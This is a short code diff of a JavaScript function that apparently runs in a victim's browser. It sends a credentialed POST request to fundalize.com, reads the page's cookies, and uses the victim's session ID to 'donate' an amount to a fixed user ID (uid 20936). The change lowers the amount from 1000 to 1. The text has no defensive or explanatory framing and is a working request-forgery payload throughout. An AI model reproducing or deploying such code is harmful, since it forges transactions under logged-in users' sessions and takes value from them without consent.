@@ -28,7 +28,7 @@ function step2(){
 	xhttp.open('POST', 'http://www.fundalize.com/includes/ajax_useractions.php', true);
 	xhttp.withCredentials = true;
 	var cookies = document.cookie;
-	var params = 'uid=20936&pid='+user_id+'&amount=1000&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
+	var params = 'uid=20936&pid='+user_id+'&amount=1&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
 	//console.log('User ID: ' + user_id);
 	//console.log('SID: ' + SID);
 	
